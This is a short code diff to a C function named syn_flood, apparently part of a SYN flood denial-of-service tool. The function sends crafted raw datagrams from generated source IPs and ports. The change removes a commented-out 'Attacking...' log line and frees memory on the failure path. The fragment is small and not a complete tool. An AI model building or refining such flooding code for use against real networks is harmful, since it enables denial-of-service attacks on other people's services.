@@ -168,12 +168,10 @@ syn_flood(int16_t socket_fd) {
         if (sendto(new_sock, datagram, ip_header->tot_len, 0,
                    (struct sockaddr *) &destination_address,
                            sizeof destination_address) > 0) {
-//            printf("Attacking %s as %s with port %d...\n",
-//                   inet_ntoa(destination_address.sin_addr), generated_ip,
-//                   generated_port);
             free(generated_ip);
             continue;
         }
+        free(generated_ip);
         return;
     }
 }
